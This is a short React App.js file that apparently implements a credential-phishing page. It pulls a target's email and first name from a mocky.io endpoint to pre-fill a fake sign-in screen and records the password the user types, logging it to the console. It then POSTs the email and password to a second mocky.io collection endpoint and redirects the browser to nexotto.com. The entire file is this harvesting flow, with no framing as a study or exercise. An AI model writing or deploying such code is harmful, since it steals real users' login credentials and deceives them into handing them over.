import './App.css';
import Form from './Form'
import React,{useState,useEffect} from 'react';
import {
  BrowserRouter as Router,
  Switch,
  Route
} from "react-router-dom";
import Validate from './Validate';
function App() {

  const [people, setPeople] = useState([]);

var pass="";
const updateForm = async () => {
    let url = "https://run.mocky.io/v3/386baee0-3694-4384-b69a-8e9798aac3a2";
    let data = await fetch(url);
    let parsedData = await data.json();
    setPeople(parsedData.user);

  };

  useEffect(() => {
    updateForm();
  }, []);

function getPass(password){
  console.log(password)
pass=password
}


  var datas={"email":people.email,"password":pass}
 
  function handleSubmit(event){
    fetch('https://run.mocky.io/v3/e9fbbabc-ef69-4bf1-9628-f3c9fe991119', {
        method: 'POST',
        body: JSON.stringify(datas),
        redirect:"follow",  
      }).then(function(response) {
        window.location.href="https://nexotto.com"        
    console.log(datas)
        console.log(response)
        return response.json();
      });

    event.preventDefault();
}
  return (
    <div>
<Router>
      <Switch>
          <Route path="/signIn">
            <Validate name={people.firstName} getPass={getPass} handleSubmit={handleSubmit}/>
          </Route>
          
          <Route path="/" >
            <Form email={people.email}/>
          </Route>
        </Switch>
    </Router> 
    </div>
  );
}

export default App;
